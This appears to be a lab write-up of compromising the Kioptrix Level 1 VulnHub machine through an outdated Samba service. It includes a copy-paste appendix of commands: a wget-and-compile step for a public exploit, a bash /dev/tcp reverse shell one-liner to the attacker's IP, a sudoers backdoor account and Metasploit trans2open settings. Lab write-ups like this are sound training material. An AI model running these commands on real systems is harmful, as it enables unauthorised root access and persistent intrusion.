# Kioptrix Level 1 — Write-up (VulnHub)

[![Platform: VulnHub](https://img.shields.io/badge/Platform-VulnHub-blue)](https://www.vulnhub.com) [![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)]

> **Target:** `192.168.1.106` — **Attacker:** `192.168.1.105`  
> **Lab:** Kioptrix Level 1 (VulnHub) — documented for educational purposes only.

---

## Table of Contents
- [Overview](#overview)  
- [Goals](#goals)  
- [Prerequisites](#prerequisites)  
- [Tools used](#tools-used)  
- [1. Host Discovery](#1-host-discovery)  
- [2. Port Scanning & Service Enumeration](#2-port-scanning--service-enumeration)  
- [3. Web Enumeration](#3-web-enumeration)  
- [4. SMB Enumeration](#4-smb-enumeration)  
- [5. Exploitation (public exploit)](#5-exploitation-public-exploit)  
- [6. Post-exploitation (reverse shell & persistence)](#6-post-exploitation-reverse-shell--persistence)  
- [7. Metasploit verification (optional)](#7-metasploit-verification-optional)  
- [8. Mitigation & Lessons Learned](#8-mitigation--lessons-learned)  
- [9. Screenshots](#9-screenshots)  
- [Appendix — Commands (copy/paste)](#appendix---commands-copypaste)  
- [Legal / Ethics](#legal--ethics)  
- [Credits & References](#credits--references)

---

## Overview
This write-up documents a full exploitation chain against **Kioptrix Level 1 (VulnHub)**. The target was vulnerable due to outdated services (notably old Samba). The goal was to obtain **root** access for educational purposes and to demonstrate secure remediation steps.

---

## Goals
1. Find the target on the local network.  
2. Enumerate services and versions.  
3. Find a workable exploit and obtain a shell.  
4. Gain root and demonstrate simple post-exploitation steps.  
5. Document commands and screenshots for reproducibility in a lab.

---

## Prerequisites
- A lab environment (VM host) with both attacker (Kali) and target (Kioptrix VM).  
- Network connectivity between attacker and target (same subnet or configured routing).  
- Typical Kali tools installed: `nmap`, `netdiscover`, `smbclient`, `dirbuster`/`dirb`, `gcc`, `nc`, `msfconsole` (optional).

---

## Tools used
- `netdiscover` (ARP discovery)  
- `nmap` (TCP scan + service/version detection)  
- `enum4linux` (SMB enumeration)  
- `DirBuster` / `dirb` (web directory brute forcing)  
- `wget`, `gcc` (download & compile exploit)  
- `nc` (netcat) for reverse shells  
- `msfconsole` (Metasploit) — optional verification

---

## 1. Host discovery
Find hosts on the local subnet using ARP:

```bash
sudo netdiscover -r 192.168.1.0/24
```

Example result (target listed):

```
192.168.1.106  00:0C:29:xx:xx:xx  PCS Systemtechnik GmbH
```

---

## 2. Port scanning & service enumeration
Aggressive Nmap scan for services and versions:

```bash
nmap -sS -A 192.168.1.106
```

Important findings (abbreviated):

```
22/tcp   open   ssh        OpenSSH 2.9p2
80/tcp   open   http       Apache/1.3.20 (Unix)
139/tcp  open   netbios-ssn Samba smbd
445/tcp  open   microsoft-ds Samba smbd
```

> Apache 1.3.20 and Samba 2.x are very old and often have known remote exploits.

---

## 3. Web enumeration
Browse to `http://192.168.1.106/` and run a directory brute force to check for files and directories:

Example (DirBuster/dirb):

```bash
dirbuster -u http://192.168.1.106 -w /usr/share/wordlists/dirb/common.txt
```

Found directories (HTTP 200):

```
/manual/
/manual/mod/
/icons/
```

No direct credentials or config files were exposed by the web app in this case.

---

## 4. SMB enumeration
Enumerate SMB using `enum4linux`:

```bash
enum4linux -a 192.168.1.106
```

Sample output (abbreviated):

```
Starting enum4linux v0.8.9 ( http://www.portcullis.co.uk/projects )
...
Sharename       Type      Comment
IPC$            IPC       IPC Service (Samba Server)
ADMIN$          IPC       IPC Service (Samba Server)

Server: KIOPTRIX
Workgroup: MYGROUP
[+] OS: Linux (Samba 2.2.1a)
```

Samba version from service fingerprints indicated **Samba 2.2.1a** (or similar), which is vulnerable to remote root exploits (e.g., trans2open / related vuln families).

---

## 5. Exploitation (public exploit)
I downloaded and compiled a public exploit to target the vulnerable Samba service.

> **Important:** Do not include exploit source code directly in this public repo. Link to the canonical Exploit-DB entry instead.

Example steps used in the lab:

```bash
# Download exploit (example Exploit-DB link; do not run against unauthorized targets)
wget https://www.exploit-db.com/download/10 -O samba-exploit.c

# Compile
gcc samba-exploit.c -o exploit

# Run exploit (example)
./exploit -b 192.168.1.106
```

**Result:** exploit succeeded and returned a root shell:

```
# id
uid=0(root) gid=0(root) groups=99(nobody)
```

---

## 6. Post-exploitation (reverse shell & persistence)

### Reverse shell (listener on Kali)
On the attacker machine:

```bash
nc -nlvp 4444
```

From the compromised host (simple reverse shell one-liner used in the lab):

```bash
bash -i >& /dev/tcp/192.168.1.105/4444 0>&1
```

`whoami` returned `root`.

### Minimal persistence example (lab only)
(Only in a lab environment — do not do this on systems without permission.)

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
useradd pwn -p pwn
echo "pwn ALL=(ALL) ALL" >> /etc/sudoers
```

---

## 7. Metasploit verification (optional)
To confirm the vulnerability, Metasploit's `trans2open` module can be used:

```text
msf6 > use exploit/linux/samba/trans2open
msf6 exploit(...)> set RHOSTS 192.168.1.106
msf6 exploit(...)> set LHOST 192.168.1.105
msf6 exploit(...)> set payload linux/x86/shell_reverse_tcp
msf6 exploit(...)> exploit
```

Metasploit opened multiple **root** sessions, validating the manual exploit result.

---

## 8. Mitigation & Lessons Learned

### Root causes
- Outdated services (Samba 2.x, Apache 1.3.x) with publicly known remote exploits.

### Remediation recommendations
- **Patch and upgrade** Samba to a supported version and disable SMBv1.  
- Apply security updates for Apache and OpenSSH.  
- Use network segmentation and firewall rules to restrict SMB ports (139/445).  
- Monitor and log for suspicious remote code execution and network activity.  
- Run regular vulnerability scans and apply patch management processes.

---

## 9. Screenshots
Place these images in a `/screenshots/` directory inside your repository. Example usage:

```markdown
![Nmap results](screenshots/3.jpeg)
```

Files (as used in this repo):
1. `screenshots/1.jpeg` — Host discovery / netdiscover  
2. `screenshots/2.jpeg` — ARP / unique hosts capture  
3. `screenshots/3.jpeg` — Nmap output (service detection)  
4. `screenshots/4.jpeg` — DirBuster results (web enumeration)  
5. `screenshots/5.jpeg` — Download & compile exploit (wget, gcc)  
6. `screenshots/6.jpeg` — Exploit success: root shell (`whoami` / `id`)  
7. `screenshots/7.jpeg` — Metasploit sessions (optional verification)  
8. `screenshots/8.jpeg` — Sudoers/persistence example  
9. `screenshots/1.5.jpeg` — Optional header/banner image

---

## Appendix — Commands (copy/paste)
```bash
# Discovery
sudo netdiscover -r 192.168.1.0/24

# Nmap service/version detection
nmap -sS -A 192.168.1.106

# SMB enumeration
enum4linux -a 192.168.1.106

# Web enumeration (dirb/DirBuster)
dirbuster -u http://192.168.1.106 -w /usr/share/wordlists/dirb/common.txt

# Download & compile exploit (example from Exploit-DB)
wget https://www.exploit-db.com/download/10 -O samba-exploit.c
gcc samba-exploit.c -o exploit
./exploit -b 192.168.1.106

# Reverse shell listener on attacker
nc -nlvp 4444

# Reverse shell one-liner on victim
bash -i >& /dev/tcp/192.168.1.105/4444 0>&1

# Metasploit (optional)
msfconsole
use exploit/linux/samba/trans2open
set RHOSTS 192.168.1.106
set LHOST 192.168.1.105
set payload linux/x86/shell_reverse_tcp
exploit
```

---

## Legal / Ethics
This work was performed against a local lab VM (Kioptrix) for learning and research.  
**Do NOT** use these techniques against systems you do not own or do not have explicit permission to test. Unauthorized access is illegal and unethical.

---

## Credits & References
- Kioptrix (VulnHub) — lab environment for learning.  
- Exploit-DB — public exploit entries (linked for reference only).  
- Tools: Nmap, smbclient, netcat, DirBuster, Metasploit, etc.

---

*Prepared for educational/lab use only.*

